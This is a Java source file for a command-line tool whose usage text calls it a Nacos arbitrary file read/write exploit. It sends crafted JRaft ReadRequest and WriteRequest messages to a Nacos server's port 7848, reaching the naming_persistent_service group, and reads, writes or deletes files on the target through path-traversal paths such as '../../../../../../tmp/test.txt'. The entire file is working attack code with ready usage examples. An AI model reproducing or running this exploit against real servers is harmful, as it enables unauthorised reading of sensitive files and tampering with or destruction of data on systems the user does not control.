package com.nacostools.rce;

import com.alibaba.nacos.consistency.entity.ReadRequest;
import com.alibaba.nacos.consistency.entity.WriteRequest;
import com.alibaba.nacos.naming.consistency.persistent.impl.BatchWriteRequest;
import com.alipay.sofa.jraft.RouteTable;
import com.alipay.sofa.jraft.conf.Configuration;
import com.alipay.sofa.jraft.entity.PeerId;
import com.alipay.sofa.jraft.option.CliOptions;
import com.alipay.sofa.jraft.rpc.impl.MarshallerHelper;
import com.alipay.sofa.jraft.rpc.impl.cli.CliClientServiceImpl;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import com.com.alibaba.nacos.consistency.serialize.JacksonSerializer;
import com.google.protobuf.ByteString;
import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ConcurrentHashMap;


public class NacosFileReadWrite {
    public static String isWrite = "";

    public static void main(String[] args) throws Exception {

        URL urlAddr = null;
        String jraftPort = "";
        String jraftAddr = "";

//示例	java -jar NacosFileReadWrite.jar http://192.168.90.1:8848 7848 write ../../../../../../tmp/test.txt testttt
        if (args.length != 4 && args.length != 5) {
            printUsage();
            System.exit(0);
        }else {
            urlAddr = new URL(args[0]);
            jraftPort = args[1];
            jraftAddr = urlAddr.getHost()+":"+jraftPort;
            isWrite = args[2].trim();


        }

        if (isWrite.contentEquals("write"))
        {
            String FilePath=args[3].trim();
            String Content=args[4].trim();

            byte[] FileBytes=FilePath.getBytes(StandardCharsets.UTF_8);
            byte[] ContentBytes=Content.getBytes(StandardCharsets.UTF_8);

            BatchWriteRequest batchWriteRequest = new BatchWriteRequest();
            batchWriteRequest.append(FileBytes,ContentBytes);

            byte[] json= JacksonSerializer.serialize(batchWriteRequest);

            try {
                sendWritePayload(jraftAddr,json);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        else if (isWrite.equals("delete"))
        {
            String FilePath=args[3].trim();
            String Content="tessssss";//删文件内容不管是啥都行

            byte[] FileBytes=FilePath.getBytes(StandardCharsets.UTF_8);
            byte[] ContentBytes=Content.getBytes(StandardCharsets.UTF_8);

            BatchWriteRequest batchWriteRequest = new BatchWriteRequest();
            batchWriteRequest.append(FileBytes,ContentBytes);

            byte[] json= JacksonSerializer.serialize(batchWriteRequest);

            try {
                sendWritePayload(jraftAddr,json);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
        else if (isWrite.equals("read"))
        {
            String FilePath=args[3].trim();

            List byteArrayList = Arrays.asList(FilePath.getBytes());

            byte[] json= JacksonSerializer.serialize(byteArrayList);

            try {
                sendReadPayload(jraftAddr,json);
            }catch (Exception e){
                e.printStackTrace();
            }
        }

    }


    private static ByteArrayOutputStream getByteArrayOutputStream(Object obj) throws IOException {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output output = new Hessian2Output(baos);
//        output.getSerializerFactory().setAllowNonSerializable(true);
        try {
            SerializerFactory serializerFactory = output.getSerializerFactory();
            serializerFactory.setAllowNonSerializable(true);
            output.writeObject(obj);
            output.flushBuffer();
        }catch (Exception e){
            e.printStackTrace();
        }

        return baos;
    }

    public static void sendReadPayload(String addr,byte[] payload) throws Exception{

        //节点标识信息
        //发请求
        Configuration conf = new Configuration();
        conf.parse(addr);
        RouteTable.getInstance().updateConfiguration("nacos", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
        PeerId leader = PeerId.parsePeer(addr);

        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.ReadRequest", ReadRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(ReadRequest .class.getName(), ReadRequest.getDefaultInstance());

        //payload绑定到ReadRequest中
        //group为naming_persistent_service
        final ReadRequest  readRequest = ReadRequest.newBuilder().setGroup("naming_persistent_service").setData(ByteString.copyFrom(payload)).build();

        /*
        任意文件读取走的是com.alibaba.nacos.naming.consistency.persistent.impl.BasePersistentServiceProcessor#onRequest
        ReadRequest和WriteRequest在com.alibaba.nacos.core.distributed.raft.NacosStateMachine#onApply中选择调用onApply还是onRequest
         */

         //发送
        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), readRequest, 5000);
        System.out.println(o.toString());

    }

    public static void sendWritePayload(String addr,byte[] payload) throws Exception{

        //节点标识信息
        //发请求
        Configuration conf = new Configuration();
        conf.parse(addr);
        RouteTable.getInstance().updateConfiguration("nacos", conf);
        CliClientServiceImpl cliClientService = new CliClientServiceImpl();
        cliClientService.init(new CliOptions());
        RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
        PeerId leader = PeerId.parsePeer(addr);

        Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
        parserClasses.setAccessible(true);
        ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());
        map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());
        MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());

        //payload绑定到writeRequest中
        //group为naming_persistent_service
        final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service").setData(ByteString.copyFrom(payload)).build();

        //任意文件读写需要设置WriteRequest的operation:Write、Read、Delete
        Field field=WriteRequest.class.getDeclaredField("operation_");
        field.setAccessible(true);
        if (isWrite.equals("write"))
            field.set(writeRequest,"Write");
        else if (isWrite.equals("delete"))
            field.set(writeRequest,"Delete");

        //发送
        Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);
        System.out.println(o.toString());

    }


    private static void printUsage() {
        System.err.println("Nacos 任意文件读写 漏洞利用工具");
        System.err.println("** 食用方式 **");
        System.err.println("示例\tjava -jar NacosFileReadWrite.jar http://192.168.90.1:8848/ 7848 write ../../../../../../tmp/test.txt 12341123413");
        System.err.println("示例\tjava -jar NacosFileReadWrite.jar http://192.168.90.1:8848/ 7848 read ../../../../../../tmp/test.txt");
        System.err.println("示例\tjava -jar NacosFileReadWrite.jar http://192.168.90.1:8848/ 7848 delete ../../../../../../tmp/test.txt");
        System.err.println();
    }

}
